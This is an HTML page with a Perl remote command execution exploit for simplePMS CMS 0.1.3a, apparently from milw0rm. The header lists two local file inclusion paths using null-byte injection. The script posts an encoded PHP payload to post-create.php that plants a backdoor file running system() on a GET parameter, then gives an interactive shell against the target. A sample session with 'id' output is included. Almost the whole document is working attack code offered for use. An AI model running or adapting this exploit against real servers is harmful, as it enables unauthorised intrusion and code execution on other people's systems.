<html><head><title>simplePMS CMS 0.1.3a LFI / Remote Command Execution Exploit</title></head><pre>#!/usr/bin/perl

# Script  : simplePMS CMS v0.1.3a
# Download: http://garr.dl.sourceforge.net/sourceforge/simplepms/simplePMS-v0-1-3prealpha.tar.bz2
# Remote Command Execution Exploit
# Also affected to multiple LFI vulnerabilities &lt;-- Needs Register Globals ON ($filename not declared)
#   /[path]/pages/template.php?filename=[lf]%00
#   /[path]/pages/comp-template.php?filename=[lf]%00
# by Osirys &lt;osirys[at]autistici[dot]org&gt;

# Let's go into the hacking ..

# osirys[~]&gt;$ perl rcex.txt http://localhost/simplePMS-v0-1-3prealpha/
#
#   ---------------------------------------
#            SimplePMS CMS  v0.1.3a
#       Remote Command Execution Sploit
#                  by Osirys
#   ---------------------------------------
#
# [*] Adding evil post ..
# [*] Succesfully backdoored !
# [&amp;] Hi my master, do your job now [!]
#
# shell[localhost]$&gt; id
# uid=80(apache) gid=80(apache) groups=80(apache)
# shell[localhost]$&gt; pwd
# /home/osirys/web/simplePMS-v0-1-3prealpha/posts
# shell[localhost]$&gt; exit
# [-] Quitting ..
# osirys[~]&gt;$

use LWP::UserAgent;
use IO::Socket;
use HTTP::Request::Common;

my $host =  $ARGV[0];
my $rand = int(rand 19) +1;
my $file = &quot;h0x&quot;.$rand;

($host) || help(&quot;-1&quot;);
cheek($host) == 1 || help(&quot;-2&quot;);
&amp;banner;

$datas = get_input($host);
$datas =~ /(.*) (.*)/;
($h0st,$path) = ($1,$2);

my $url = $path.&quot;/post-create.php&quot;;

my $code = &quot;insert=Before&amp;filename=&quot;.$file.&quot;&amp;topic=1337&amp;story=owned%22%3Be&quot;.
           &quot;cho+%22p0w%22%3Bif%28get_magic_quotes_gpc%28%29%29%7B+%24_GET%&quot;.
           &quot;5Bcmd%5D%3Dstripslashes%28%24_GET%5Bcmd%5D%29%3B%7Dsystem%28%2&quot;.
           &quot;4_GET%5Bcmd%5D%29%3Becho+%22p0w%22%3B%24a+%3D+%22o&amp;poster=owner&quot;;

my $length = length($code);

my $data = &quot;POST &quot;.$url.&quot; HTTP/1.1\r\n&quot;.
           &quot;Host: &quot;.$h0st.&quot;\r\n&quot;.
           &quot;Keep-Alive: 300\r\n&quot;.
           &quot;Connection: keep-alive\r\n&quot;.
           &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;.
           &quot;Content-Length: &quot;.$length.&quot;\r\n\r\n&quot;.
           $code.&quot;\r\n&quot;;

my $socket   =  new IO::Socket::INET(
                                         PeerAddr =&gt; $h0st,
                                         PeerPort =&gt; '80',
                                         Proto    =&gt; 'tcp',
                                    ) or die &quot;[-] Can't connect to $h0st:80\n[?] $! \n\n&quot;;

print &quot;[*] Adding evil post ..\n&quot;;
$socket-&gt;send($data);

while ((my $e = &lt;$socket&gt;)&amp;&amp;($own != 1)) {
    if ($e =~ /Sucessfully created post for/) {
        $own = 1;
        print &quot;[*] Succesfully backdoored ! \n&quot;;
    }
}
$own == 1 || die &quot;[-] Can't add posts !\n&quot;;

print &quot;[&amp;] Hi my master, do your job now [!]\n\n&quot;;
&amp;exec_cmd;

sub exec_cmd {
    my(@outs,$out);
    $h0st !~ /www\./ || $h0st =~ s/www\.//;
    print &quot;shell[$h0st]\$&gt; &quot;;
    $cmd = &lt;STDIN&gt;;
    $cmd !~ /exit/ || die &quot;[-] Quitting ..\n&quot;;
    $exec_url = $host.&quot;/posts/&quot;.$file.&quot;-posts.php?cmd=&quot;.$cmd;
    $re = get_req($exec_url);
    $content = tag($re);
    if ($content =~ /p0w(.+)p0w/) {
        my $out = $1;
        $out =~ s/\$/ /g;
        $out =~ s/\*/\n/g;
        chomp($out);
        print &quot;$out\n&quot;;
        &amp;exec_cmd;
    }
    else {
        $c++;
        $cmd =~ s/\n//;
        print &quot;bash: &quot;.$cmd.&quot;: command not found\n&quot;;
        $c &lt; 3 || die &quot;[-] Command are not executed.\n[-] Something wrong. Exploit Failed !\n\n&quot;;
    }
}

sub get_req() {
    $link = $_[0];
    my $req = HTTP::Request-&gt;new(GET =&gt; $link);
    my $ua = LWP::UserAgent-&gt;new();
    $ua-&gt;timeout(4);
    my $response = $ua-&gt;request($req);
    return $response-&gt;content;
}

sub cheek() {
    my $host = $_[0];
    if ($host =~ /http:\/\/(.*)/) {
        return 1;
    }
    else {
        return 0;
    }
}

sub get_input() {
    my $host = $_[0];
    $host =~ /http:\/\/(.*)/;
    $s_host = $1;
    $s_host =~ /([a-z.-]{1,30})\/(.*)/;
    ($h0st,$path) = ($1,$2);
    $path =~ s/(.*)/\/$1/;
    $full_det = $h0st.&quot; &quot;.$path;
    return $full_det;
}

sub tag() {
    my $string = $_[0];
    $string =~ s/\n/\*/g;
    return($string);
}

sub banner {
    print &quot;\n&quot;.
          &quot;  --------------------------------------- \n&quot;.
          &quot;           SimplePMS CMS  v0.1.3a         \n&quot;.
          &quot;      Remote Command Execution Sploit     \n&quot;.
          &quot;                 by Osirys                \n&quot;.
          &quot;  --------------------------------------- \n\n&quot;;
}

sub help() {
    my $error = $_[0];
    if ($error == -1) {
        &amp;banner;
        print &quot;\n[-] Bad hostname! \n&quot;;
    }
    elsif ($error == -2) {
        &amp;banner;
        print &quot;\n[-] Bad hostname address !\n&quot;;
    }
    print &quot;[*] Usage : perl $0 http://hostname/cms_path\n\n&quot;;
    exit(0);
}

# milw0rm.com [2009-02-16]</pre></html>